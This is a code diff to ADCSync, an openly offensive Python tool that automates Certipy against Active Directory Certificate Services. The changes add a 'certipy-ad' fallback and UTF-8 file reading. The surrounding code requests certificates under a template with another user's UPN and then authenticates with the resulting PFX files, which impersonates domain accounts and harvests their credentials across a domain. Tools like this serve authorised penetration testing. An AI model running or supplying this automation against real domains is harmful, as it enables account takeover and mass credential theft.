@@ -11,7 +11,11 @@ from ldap3 import Server, Connection, ALL, SIMPLE, SYNC, SUBTREE# Print stuff
 ascii_art = Figlet(font='slant')
 print(ascii_art.renderText('ADCSync'))
 
-if not shutil.which("certipy"):
+if shutil.which("certipy"):
+    certipy_client = "certipy"
+elif shutil.which("certipy-ad"):
+    certipy_client = "certipy-ad"
+else:
     print("Certipy not found. Please install Certipy before running ADCSync")
     exit(1)
 
@@ -33,7 +37,7 @@ def main(file, output, ca, dc_ip, user, password, template, target_ip):
         exit(1)
 
     try:
-        with open(file, 'r') as file_obj:
+        with open(file, 'r', encoding='utf-8') as file_obj:
             data = json.load(file_obj)
     except json.JSONDecodeError:
         print(f"Error: The file '{file}' does not contain valid JSON.")
@@ -66,7 +70,7 @@ def main(file, output, ca, dc_ip, user, password, template, target_ip):
         domain = usernames_with_domains.get(f'{username}@{domain}')
 
         command = [
-            'certipy', 'req', '-u', user, '-p', password, '-target-ip', target_ip,
+            certipy_client, 'req', '-u', user, '-p', password, '-target-ip', target_ip,
             '-dc-ip', dc_ip, '-ca', ca, '-template', template, '-upn', name
         ]
         process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
@@ -97,7 +101,7 @@ def main(file, output, ca, dc_ip, user, password, template, target_ip):
                 # Get the domain associated with the username
                 domain = usernames_with_domains.get(f'{username}@{domain}')
 
-                command = ['certipy', 'auth', '-pfx', certificate, '-username', username, '-dc-ip', dc_ip]
+                command = [certipy_client, 'auth', '-pfx', certificate, '-username', username, '-dc-ip', dc_ip]
                 process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                 stdout, stderr = process.communicate()
 
